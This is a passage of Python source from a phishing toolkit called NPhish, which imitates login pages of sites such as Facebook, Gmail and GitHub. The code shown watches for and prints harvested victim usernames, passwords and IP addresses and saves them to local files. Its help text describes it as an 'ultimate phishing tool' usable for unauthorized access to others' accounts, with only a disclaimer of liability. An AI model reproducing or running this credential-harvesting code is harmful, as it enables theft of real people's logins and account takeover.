            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Victim login info found!\n\007")
                with open(root+"/.site/usernames.txt","r") as userfile:
                    userdata=userfile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+userdata[j],end="")
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(bgreen + logo)
                print("\n\n"+success+bgreen+"Victim IP found!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+green+'*'+cyan+'] '+yellow+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Saved in ip.txt")
                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        exit_msg()

description = yellow + """Ultimate phishing tool in python. Includes popular websites like facebook, twitter, instagram, github, reddit, gmail and many others.
\n\nThis tool is developed for educational purposes. Here it demonstrates how phishing works. If anybody wants to gain unauthorized access to someones social media, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of NPhish!
""" + nc

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by Nishant !!!')
parser.add_argument("-u", "--update", action="store_true",
                    help="update NPhish")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current NPhish contributors")
parser.add_argument("-v", "--version", action="store_true",
                    help="show current NPhish version")

if __name__ == '__main__':
    args = parser.parse_args()
    if args.version:
        print("Version: ", version)
    elif args.contributors:
        print("Contributors: NISHANT")
    elif args.update:
        update()
    else:
        try:
            update()
            main()
        except KeyboardInterrupt:
            exit_msg()
